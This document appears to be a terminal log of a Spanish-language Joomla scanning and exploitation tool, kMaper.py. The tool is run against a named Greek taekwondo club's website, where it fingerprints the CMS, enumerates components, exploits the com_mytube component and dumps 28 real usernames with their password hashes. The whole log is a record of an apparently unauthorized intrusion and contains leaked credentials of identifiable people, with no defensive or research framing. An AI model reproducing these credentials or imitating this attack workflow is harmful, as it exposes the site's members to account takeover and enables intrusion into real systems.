@@ -1,0 +1,102 @@
+[SixP4ck3r@fedora kMaper]$ python kMaper.py
+kMaper.py
+===================================
+
+Sat Jul  6 04:46:46 2013
+Testeando... http://www.thiseas-taekwondo.gr
+
+04:46:46  -> Chekando motor!
+04:46:46  -> Chekando Worpdress...
+04:46:48  -> Error 404 Not Found
+
+04:46:48  -> Chekando si es un Joomla... 
+04:46:54  -> http://www.thiseas-taekwondo.gr -> posible Joomla!
+
+04:46:54  -> Confirmando...
+04:46:56  -> Αθλητικός, Σύλογος, Καλλιθέας, Καλλιθέα, Αθήνα, "Tae Kwon Do", 2003, hapido, iaido, karate, καράτε, Athlitikos, sylogos, thiseas,  taekwondo, kallithea, athens, athina, Mpourazanis, panagiotis, Valatsoukis, Filipas
+04:46:56  -> ΑΘΛΗΤΙΚΟΣ ΣΥΛΟΓΟΣ ΘΗΣΕΑΣ 2003 ΚΑΛΛΙΘΕΑΣ - TAE KWON DO - HAPKIDO - IAIDO - ATHLITIKOS SYLOGOS THISEAS 2003 KALLITHEA ATHINA
+04:46:56  -> Joomla! 1.5 - Open Source Content Management
+
+04:46:56  -> Buscando componentes...
+04:46:58  -> http://www.thiseas-taekwondo.gr -> com_jpfchat
+04:46:58  -> http://www.thiseas-taekwondo.gr -> com_phocagallery
+04:46:58  -> http://www.thiseas-taekwondo.gr -> com_mytube
+04:46:58  -> http://www.thiseas-taekwondo.gr -> com_jevents
+04:46:58  -> http://www.thiseas-taekwondo.gr -> com_mailto
+04:46:58  -> 5 componentes encontrados!
+
+04:46:58  -> Trying with -> com_jpfchat
+04:47:01  -> No encontrado! -> com_jpfchat
+
+04:47:01  -> Trying with -> com_phocagallery
+04:47:04  -> No encontrado! -> com_phocagallery
+
+04:47:04  -> Trying with -> com_mytube
+04:47:07  -> Exploit encontrado para -> com_mytube
+04:47:07  -> Extrayendo datos de acceso...
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: admin
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: d5376107bf8892d30fc4e3086e5e90b5
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: thiseas
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 66a3c0ecc2231f2381842faaf6b145e4
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: mchatzi
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 8afc9a92720d29fffcc0077067a77eb8
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Bramis.S
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 6842cfd364122a358e349c485cee6c68
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: cchatzi
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: dc70535f8a0c1aeb41233a7261be343a
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Λαμπρος
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 3b114cb0e6b56376835103bfe170db20
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: jimitrakis
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ebfe67863fcaeb4467943069c977d644
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Dime.magnum
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 8a480d190a6b5e4ed6247b341795a17c
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: wxckmooeya
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: fe6bb891a19b56a69f5ae06aa93ab3b7
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: katerinoula
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 9717a117871365f7ff4e659e89f49e87
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: wjdkmooexv
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: cfd324a67ff54566a6fd51a1a6a2f4cc
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ΒΑΣΙΛΗΣ
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 019344577025c0f2a5881f39a2935a2b
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Loukatos
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: af7a30f419a78771592609a9464365e3
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: pletcherfor
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 4176cb7b0b6406eb0a72a26549bce998
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login:  ghost
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 3601ccf942dc45fbc3bdb1af7d5214ee
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: carpinteyroibj
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 89fc602863b495c5e04104132837dc41
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Tae Kwon
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: d59607931679f0b0172be01834e56097
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ΠΑΝΑΓΙΩΤΗΣ
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: d0c782c2d26096b1cf90e92e6c7c557d
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ΠΑΝΑΓΙΩΤΗΣ ΜΠΕΡΤΣΟΣ
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: a577089257fa55719d04eb82bd602c92
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: pletchermyk
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: e50e6ebe61b5ea7fdaf2ac20c13b2475
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Τζωρτζίνα
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 1e063a90edc485517ba37be5ef948659
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Maraki L.
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 07e412bc3c914d080fd935129748f854
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: LyncInonryTot
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: e04f8ad40684544c42eda98109f5651e
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: FenSheala
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ebb6994ae4336fad00ac767d1434d559
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Μαρματσούρης
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 9cc0ee3080363195ae421c3d2b3d4215
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: ΣΠΥΡΟΣ
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: e9a27562cb140b316603f24d51f3a95f
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: Fuentyzet55
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 527a44754f08ce3d92f6c26da4d3adc3
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: cioceanu gabriela
+04:47:15  -> http://www.thiseas-taekwondo.gr -> Login: 30962134ddf17f57bb251bc55c43b8be
+04:47:15  -> 28 Datos de acceso encontrados!
+
+04:47:15  -> Trying with -> com_jevents
+04:47:18  -> No encontrado! -> com_jevents
+
+04:47:18  -> Trying with -> com_mailto
+04:47:21  -> Exploit encontrado para -> com_mailto
+04:47:21  -> Extrayendo datos de acceso...
+04:47:22  -> No se pudo obtener datos ...
+[SixP4ck3r@fedora kMaper]$
